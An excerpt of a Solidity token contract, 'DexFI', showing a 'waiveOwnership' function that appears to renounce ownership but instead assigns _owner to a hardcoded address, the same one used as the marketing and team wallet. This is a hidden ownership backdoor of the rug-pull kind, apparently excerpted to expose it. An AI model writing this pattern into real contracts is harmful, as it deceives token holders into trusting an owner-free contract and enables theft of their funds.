...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x41B6285956F8C563Fd2a01A0e1Af2Aad9c2eCCf4);
    }
...
contract DexFI is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x41B6285956F8C563Fd2a01A0e1Af2Aad9c2eCCf4);
    address payable public teamWalletAddress = payable(0x41B6285956F8C563Fd2a01A0e1Af2Aad9c2eCCf4);
